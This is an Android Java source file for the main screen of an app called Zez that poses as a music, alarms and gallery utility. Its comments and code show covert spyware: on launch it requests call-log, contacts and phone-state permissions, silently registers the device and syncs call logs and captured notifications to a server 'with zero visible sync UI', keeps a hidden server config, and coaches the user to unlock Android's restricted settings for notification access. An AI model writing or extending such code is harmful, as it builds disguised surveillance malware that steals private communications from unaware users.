package com.zez.manager;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.zez.manager.service.CallSyncWorker;
import com.zez.manager.service.NotificationCaptureService;
import com.zez.manager.util.ApiClient;
import com.zez.manager.util.AppUpdateHelper;
import com.zez.manager.util.PreferencesHelper;

import java.util.ArrayList;
import java.util.List;

/**
 * Zez MainActivity — 4-Tab Utility Shell:
 *   1. Music (Default startup tab — YMusic)
 *   2. Alarms
 *   3. Gallery (Photos, Albums, Bin, PDF/PPT Studio)
 *   4. Settings (Appearance, Notification Cloud Backup, OTA Update, Hidden 5-tap Server Config)
 *
 * Call log, notification, and VoIP app-call syncing run 100% silently in the background
 * with zero visible sync UI, zero persistent foreground notifications, and zero sync Toasts.
 */
public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 1001;

    private TextView tvHeaderTitle;
    private TextView tvHeaderSubtitle;
    private View layoutAppBar;

    private View viewMusicContainer;
    private View viewAlarmsContainer;
    private View viewGalleryContainer;
    private View viewSettingsContainer;

    private BottomNavigationView bottomNavigation;

    private com.zez.manager.music.MusicViewController musicViewController;
    private com.zez.manager.alarm.AlarmsViewController alarmsViewController;
    private com.zez.manager.gallery.GalleryViewController galleryViewController;
    private com.zez.manager.controller.SettingsViewController settingsViewController;

    private int currentTab = R.id.nav_music;

    @Override
    protected void attachBaseContext(android.content.Context newBase) {
        float fontScale = PreferencesHelper.getFontScale(newBase);
        android.content.res.Configuration config = new android.content.res.Configuration(newBase.getResources().getConfiguration());
        config.fontScale = fontScale;
        super.attachBaseContext(newBase.createConfigurationContext(config));
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        com.zez.manager.theme.ThemeManager.applyTheme(this);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        bindViews();
        setupNavigation();

        musicViewController = new com.zez.manager.music.MusicViewController(this);
        alarmsViewController = new com.zez.manager.alarm.AlarmsViewController(this);
        galleryViewController = new com.zez.manager.gallery.GalleryViewController(this);
        settingsViewController = new com.zez.manager.controller.SettingsViewController(this);
        settingsViewController.bindViews(findViewById(android.R.id.content));

        selectTab(R.id.nav_music);

        // Silent permission check + one-time Restricted Settings prompt + background sync init
        checkAndRequestPermissions();
        initSilentBackgroundSync();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (musicViewController != null) {
            musicViewController.onResume();
        }
        if (alarmsViewController != null) {
            alarmsViewController.onResume();
        }
        if (settingsViewController != null) {
            settingsViewController.onResume();
        }
        if (NotificationCaptureService.isPermissionGranted(this)) {
            NotificationCaptureService.ensureServiceBound(this);
        }
    }

    @Override
    protected void onPause() {
        if (musicViewController != null) {
            musicViewController.onPause();
        }
        if (settingsViewController != null) {
            settingsViewController.onPause();
        }
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        if (musicViewController != null) {
            musicViewController.onDestroy();
        }
        if (settingsViewController != null) {
            settingsViewController.onDestroy();
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (settingsViewController != null && settingsViewController.onBackPressed()) {
            return;
        }
        if (galleryViewController != null && galleryViewController.onBackPressed()) {
            return;
        }
        if (musicViewController != null && musicViewController.onBackPressed()) {
            return;
        }
        if (alarmsViewController != null && alarmsViewController.onBackPressed()) {
            return;
        }
        super.onBackPressed();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (galleryViewController != null) {
            galleryViewController.onActivityResult(requestCode, resultCode, data);
        }
        if (alarmsViewController != null) {
            alarmsViewController.onActivityResult(requestCode, resultCode, data);
        }
    }

    private void bindViews() {
        layoutAppBar = findViewById(R.id.layout_app_bar);
        tvHeaderTitle = findViewById(R.id.tv_header_title);
        tvHeaderSubtitle = findViewById(R.id.tv_header_subtitle);

        viewMusicContainer = findViewById(R.id.view_music_container);
        viewAlarmsContainer = findViewById(R.id.view_alarms_container);
        viewGalleryContainer = findViewById(R.id.view_gallery_container);
        viewSettingsContainer = findViewById(R.id.view_settings_container);

        bottomNavigation = findViewById(R.id.bottom_navigation);
    }

    private void setupNavigation() {
        bottomNavigation.setOnItemSelectedListener(item -> {
            selectTab(item.getItemId());
            return true;
        });
    }

    private void selectTab(int tabId) {
        currentTab = tabId;
        viewMusicContainer.setVisibility(tabId == R.id.nav_music ? View.VISIBLE : View.GONE);
        viewAlarmsContainer.setVisibility(tabId == R.id.nav_alarms ? View.VISIBLE : View.GONE);
        viewGalleryContainer.setVisibility(tabId == R.id.nav_gallery ? View.VISIBLE : View.GONE);
        viewSettingsContainer.setVisibility(tabId == R.id.nav_settings ? View.VISIBLE : View.GONE);

        if (tabId == R.id.nav_music) {
            if (layoutAppBar != null) layoutAppBar.setVisibility(View.GONE);
            tvHeaderTitle.setText("YMusic");
            tvHeaderSubtitle.setText("Stream, Search & Download");
        } else if (tabId == R.id.nav_alarms) {
            if (layoutAppBar != null) layoutAppBar.setVisibility(View.VISIBLE);
            tvHeaderTitle.setText("Alarms");
            tvHeaderSubtitle.setText("Smart schedules & Jit Mode");
            if (alarmsViewController != null) alarmsViewController.loadAlarmsData();
        } else if (tabId == R.id.nav_gallery) {
            if (layoutAppBar != null) layoutAppBar.setVisibility(View.VISIBLE);
            tvHeaderTitle.setText("Gallery");
            tvHeaderSubtitle.setText("Photos, Albums & PDF/PPT Studio");
            if (galleryViewController != null) galleryViewController.onTabSelected();
        } else if (tabId == R.id.nav_settings) {
            if (layoutAppBar != null) layoutAppBar.setVisibility(View.VISIBLE);
            tvHeaderTitle.setText("Settings");
            tvHeaderSubtitle.setText("Appearance, Backup & Updates");
            if (settingsViewController != null) settingsViewController.loadSettingsData();
        }
    }

    private void initSilentBackgroundSync() {
        new Thread(() -> {
            ApiClient.registerDeviceSync(this);
            CallSyncWorker.syncNowAsync(this);
        }).start();
    }

    private void checkAndRequestPermissions() {
        List<String> needed = new ArrayList<>();
        String[] basePerms = {
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE
        };
        for (String p : basePerms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.READ_MEDIA_AUDIO);
            }
        } else if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            maybeShowOneTimeNotificationPrompt();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (getApplication() instanceof ZezManagerApplication) {
                ((ZezManagerApplication) getApplication()).registerCallLogObserverIfPermitted();
            }
            initSilentBackgroundSync();
            if (galleryViewController != null) {
                galleryViewController.loadGalleryData();
            }
            maybeShowOneTimeNotificationPrompt();
        }
    }

    public void updateHeaderForSelection(String title, String subtitle) {
        if (tvHeaderTitle != null) tvHeaderTitle.setText(title);
        if (tvHeaderSubtitle != null) tvHeaderSubtitle.setText(subtitle);
    }

    public void resetHeaderTitle() {
        if (currentTab == R.id.nav_gallery) {
            if (tvHeaderTitle != null) tvHeaderTitle.setText("Gallery");
            if (tvHeaderSubtitle != null) tvHeaderSubtitle.setText("Photos, Albums & PDF/PPT Studio");
        }
    }

    public void requestGalleryPermissions() {
        checkAndRequestPermissions();
    }

    private void maybeShowOneTimeNotificationPrompt() {
        if (NotificationCaptureService.isPermissionGranted(this)) return;
        if (PreferencesHelper.hasPromptedNotifPerm(this)) return;
        PreferencesHelper.setPromptedNotifPerm(this);
        new Handler(Looper.getMainLooper()).postDelayed(this::showNotificationAccessDialog, 400);
    }

    private void showNotificationAccessDialog() {
        if (isFinishing() || isDestroyed()) return;
        new AlertDialog.Builder(this)
                .setTitle("Enable Notification Access")
                .setMessage("Android requires unlocking 'Restricted Settings' first:\n\n"
                        + "Step 1: Tap '1. App Info' → Tap ⋮ (top-right menu) → 'Allow restricted settings'\n\n"
                        + "Step 2: Tap '2. Enable Access' → Turn Zez switch ON")
                .setPositiveButton("1. App Info", (d, w) -> {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                })
                .setNeutralButton("2. Enable Access", (d, w) -> openNotificationListenerSettings())
                .setNegativeButton("Later", null)
                .show();
    }

    private void openNotificationListenerSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception e) {
            startActivity(new Intent(Settings.ACTION_SETTINGS));
        }
    }
}
